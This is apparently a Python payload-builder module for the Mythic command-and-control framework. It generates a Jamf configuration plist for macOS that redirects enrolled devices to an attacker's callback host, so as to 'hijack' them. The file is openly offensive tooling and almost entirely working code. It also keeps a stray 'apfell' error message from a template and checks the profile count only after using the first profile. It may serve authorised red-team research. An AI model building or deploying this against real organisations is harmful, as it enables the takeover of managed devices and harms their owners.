from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import sys
import json

#define your payload type class here, it must extend the PayloadType class though
class typhon(PayloadType):

    name = "typhon"  # name that would show up in the UI
    file_extension = "plist"  # default file extension to use when creating payloads
    author = "@calhall"  # author of the payload type
    supported_os = [SupportedOS.MacOS]  # supported OS and architecture combos

    wrapper = False  # does this payload type act as a wrapper for another payloads inside of it?
    # if the payload supports any wrapper payloads, list those here
    wrapped_payloads = [] # ex: "service_wrapper"
    note = """This payload is used to replace the Jamf config to hijack enrolled devices."""
    supports_dynamic_loading = False  # setting this to True allows users to only select a subset of commands when generating a payload
    build_parameters = [
        #  these are all the build parameters that will be presented to the user when creating your payload
        # we'll leave this blank for now
    ]
    #  the names of the c2 profiles that your agent supports
    c2_profiles = ["jamfserver"]
    translation_container = None
    # after your class has been instantiated by the mythic_service in this docker container and all required build parameters have values
    # then this function is called to actually build the payload
    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)

        # create the payload
        try:
            c2_code = open(self.agent_code_path / "com.jamfsoftware.jamf.plist").read()
            c2_code = c2_code.replace("JSS_URL_VALUE", self.c2info[0].get_parameters_dict()['callback_host'])
            c2_code = c2_code.replace("UUID_HERE", self.uuid)

            if len(self.c2info) != 1:
                resp.set_status(BuildStatus.Error)
                resp.set_message(
                    "Error building payload - apfell only supports one c2 profile at a time."
                )
                return resp

            resp.payload = c2_code.encode()
            resp.message = "Successfully built!"
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.set_message("Error building payload: " + str(e))
        return resp
